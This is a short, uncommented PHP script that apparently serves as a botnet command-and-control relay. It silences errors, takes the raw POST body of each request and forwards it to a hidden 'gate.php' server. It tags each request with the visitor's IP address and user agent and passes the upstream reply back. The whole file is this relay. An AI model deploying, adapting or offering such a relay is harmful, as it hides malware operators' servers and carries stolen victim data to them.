<?php

$url = "http://csr/gate.php";

@error_reporting(0); 
@set_time_limit(0);

$url = @parse_url($url);

if (!isset($url['port']))
	$url['port'] = 80; 

if (($real_server = @fsockopen($url['host'], $url['port'])) === false)
	die();

if (($data = @file_get_contents('php://input')) === false) 
	$data = '';

$request  = "POST {$url['path']}?ip=" . urlencode($_SERVER['REMOTE_ADDR']) . " HTTP/1.1\r\n";
$request .= "Host: {$url['host']}\r\n";

if (!empty($_SERVER['HTTP_USER_AGENT']))
	$request .= "User-Agent: {$_SERVER['HTTP_USER_AGENT']}\r\n";

$request .= "Content-Length: " . strlen($data) . "\r\n";
$request .= "Connection: Close\r\n";

fwrite ($real_server, $request . "\r\n" . $data);

$result = '';

while (!feof($real_server))
	$result .= fread($real_server, 1024);

fclose($real_server);

echo substr($result, strpos($result, "\r\n\r\n") + 4);

?>